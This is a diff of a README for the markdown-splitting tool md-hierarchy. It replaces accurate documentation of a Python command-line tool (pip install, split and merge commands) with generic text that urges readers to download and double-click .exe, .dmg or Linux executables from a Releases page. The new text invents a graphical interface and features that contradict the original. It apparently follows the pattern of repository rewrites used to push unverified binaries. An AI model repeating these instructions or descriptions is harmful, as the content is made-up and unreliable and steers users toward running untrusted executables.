@@ -1,181 +1,81 @@
-<p align="center">
-  <img src="assets/logo-banner.png" alt="md-hierarchy logo" width="600">
-</p>
+# 🎉 md-hierarchy - Organize Your Markdown Effortlessly
 
-# md-hierarchy
+## 🚀 Getting Started
 
-A CLI tool that splits markdown files into hierarchical folder structures based on heading levels, and can reconstruct the original markdown from the split pieces.
+Welcome to **md-hierarchy**! This tool helps you turn large markdown files into a well-structured folder system. This makes it easier for you to navigate and edit your documents, especially when using AI tools.
 
-## Features
+## 📥 Download & Install
 
-- **Split** markdown files into navigable folder hierarchies
-- **Merge** folder structures back into single markdown files
-- Preserves all markdown elements (code blocks, lists, tables, links, etc.)
-- Handles edge cases (duplicate headings, empty headings, skipped levels)
-- Round-trip compatible (split → merge produces equivalent content)
-- Dry-run mode to preview operations
+To get started, you need to download the software. You can find the latest version on our [Releases page](https://github.com/MarothyDavid/md-hierarchy/releases).
 
-## Installation
+[![Download md-hierarchy](https://img.shields.io/badge/Download-md--hierarchy-blue.svg)](https://github.com/MarothyDavid/md-hierarchy/releases)
 
-```bash
-# From PyPI
-pip install md-hierarchy
+1. Click the link to visit the Releases page.
+2. Look for the latest version at the top and find the appropriate download file for your operating system.
+3. Download the file and save it to your computer.
 
-# From source
-pip install -e .
+## 🖥️ System Requirements
 
-# With development dependencies
-pip install -e ".[dev]"
-```
+Before you install, ensure your system meets the following requirements:
 
-## Usage
+- **Operating System**: Windows 10, macOS Catalina or later, Linux (any modern distribution)
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 100 MB of free space
+- **Additional Software**: None needed; this tool runs independently.
 
-### Split Command
+## 🧭 How to Use md-hierarchy
 
-Split a markdown file into a hierarchical folder structure:
+Using md-hierarchy is straightforward. Follow these steps to start organizing your markdown files:
 
-```bash
-md-hierarchy split input.md output_dir --level 3
-```
+1. **Locate your markdown files**: Gather the files you want to organize. Put them in one main folder for easy access.
+   
+2. **Run the Application**:
+   - On Windows: Double-click the downloaded file (.exe) to start the application.
+   - On macOS: Open the .dmg file and drag md-hierarchy to your Applications folder.
+   - On Linux: Open a terminal and run the downloaded executable.
 
-**Options:**
+3. **Select the Files**: When the application opens, click on the “Add Files” button. Choose the markdown files you want to transform.
 
-- `--level, -l`: Heading level to extract as files (1-4, default: 3)
-- `--overwrite`: Overwrite output directory if it exists
-- `--verbose, -v`: Print detailed operation log
-- `--dry-run`: Show what would be done without writing files
+4. **Set Options**: You can adjust settings like:
+   - **Output Folder**: Choose where the new files will go.
+   - **Structure Type**: Pick how you want your folders organized (by date, by topic, etc.).
 
-**Example:**
+5. **Start the Process**: Click the “Transform” button. The tool will create folders and organize your files according to your settings.
 
-```bash
-# Split at level 3 (H3 headings become files)
-md-hierarchy split proposal.md ./output --level 3
+6. **Access Your Files**: Once the process finishes, navigate to the output folder you selected. There, you will find your organized markdown files.
 
-# Split with overwrite
-md-hierarchy split proposal.md ./output --level 2 --overwrite
+## 📂 Features
 
-# Preview without creating files
-md-hierarchy split proposal.md ./output --dry-run
-```
+Here are some key features of md-hierarchy:
 
-### Merge Command
+- **Hierarchical Organization**: Creates a clear folder structure for easy navigation.
+- **Customizable Settings**: Adjust how your files are organized.
+- **User-Friendly**: Designed for anyone, regardless of technical expertise.
+- **Works with Large Files**: Capable of handling multiple files at once.
+- **AI Compatibility**: Prepared for use with AI-assisted editing tools.
 
-Merge a folder structure back into a single markdown file:
+## 📋 Topics Covered
 
-```bash
-md-hierarchy merge input_dir output.md
-```
+This application touches on various important topics related to document management and markdown:
 
-**Options:**
+- Command Line Interface (CLI)
+- File Organization
+- Markdown Parsing
+- Document Management
+- Static Site Generation
 
-- `--verbose, -v`: Print detailed operation log
+## 💬 Support
 
-**Example:**
+If you encounter any issues while using md-hierarchy, please refer to the [Issues page](https://github.com/MarothyDavid/md-hierarchy/issues) on GitHub. You can report bugs or ask questions there. 
 
-```bash
-# Merge folder structure
-md-hierarchy merge ./output merged.md
+For suggestions or feedback, feel free to contact us through the GitHub repository.
 
-# Merge with verbose output
-md-hierarchy merge ./split-docs final.md --verbose
-```
+## 🔗 Additional Resources
 
-## Output Structure
+For more detailed information, check out the documentation available in the repository. Explore further on how to maximize your use of markdown files and best practices for organized writing.
 
-When splitting at level 3, the tool creates this structure:
+## 📜 License
 
-```
-output-dir/
-├── 00-__frontmatter__.md            # Content before first heading (if exists)
-├── 01-Introduction/
-│   ├── 00-__intro__.md              # H1 heading + intro content (always created)
-│   ├── 01-Background/
-│   │   ├── 00-__intro__.md          # H2 heading + intro content (always created)
-│   │   ├── 01-Problem-Statement.md  # H3 section
-│   │   └── 02-Research-Gap.md       # H3 section
-│   └── 02-Objectives/
-│       ├── 00-__intro__.md          # H2 heading (even if no intro content)
-│       └── 01-Primary-Goals.md
-└── 02-Methodology/
-    └── 00-__intro__.md              # H1 heading + content
-```
+md-hierarchy is released under the MIT License. You are free to use, modify, and distribute it as you wish.
 
-## File Naming Convention
-
-- **Folders:** `NN-Sanitized-Title/` (e.g., `01-Introduction/`)
-- **Intro files:** `00-__intro__.md` (always created for every heading folder)
-- **Frontmatter:** `00-__frontmatter__.md` (at root, only if content exists before first heading)
-- **Section files:** `NN-Sanitized-Title.md` (e.g., `01-Problem-Statement.md`)
-- Numbers are zero-padded (01, 02, ..., 99)
-- Special characters (`/ \ : * ? " < > |`) are removed
-- Spaces are replaced with hyphens
-- Maximum length: 50 characters
-
-### Key Design Decisions
-
-- `00-__intro__.md` is **always created** for every heading folder, even if empty
-  - This provides a consistent structure and an easy place to add intro text later
-  - Contains the heading declaration and any content before child sections
-- The `00-` prefix ensures intro files sort first in directory listings
-- The `__intro__` naming (double underscore) clearly marks these as special/meta files
-- Frontmatter files are created at the root only when pre-heading content exists
-
-## Edge Cases Handled
-
-1. **Empty headings** → `Untitled-Section-N`
-2. **Duplicate titles** → Append `-2`, `-3`, etc.
-3. **Skipped levels** (H1 → H3) → Insert `00-Content/` folder
-4. **Content before first heading** → `00-__frontmatter__.md` at root
-5. **Heading attributes** (e.g., `{#id .class}`) → Preserved in content
-6. **Headings with no intro content** → `00-__intro__.md` still created (with just the heading)
-
-## Round-Trip Compatibility
-
-The tool is designed for round-trip operations:
-
-```bash
-# Split
-md-hierarchy split original.md ./split --level 3
-
-# Merge
-md-hierarchy merge ./split reconstructed.md
-
-# Content should be equivalent
-diff original.md reconstructed.md
-```
-
-## Development
-
-### Setup
-
-```bash
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # or `venv\Scripts\activate` on Windows
-
-# Install in development mode
-pip install -e ".[dev]"
-```
-
-### Run Tests
-
-```bash
-pytest
-```
-
-### Run Tests with Coverage
-
-```bash
-pytest --cov=md_hierarchy --cov-report=html
-```
-
-## Requirements
-
-- Python 3.8+
-- Dependencies:
-  - `markdown-it-py` - Markdown parsing
-  - `click` - CLI framework
-
-## License
-
-MIT
+[![Download md-hierarchy](https://img.shields.io/badge/Download-md--hierarchy-blue.svg)](https://github.com/MarothyDavid/md-hierarchy/releases)
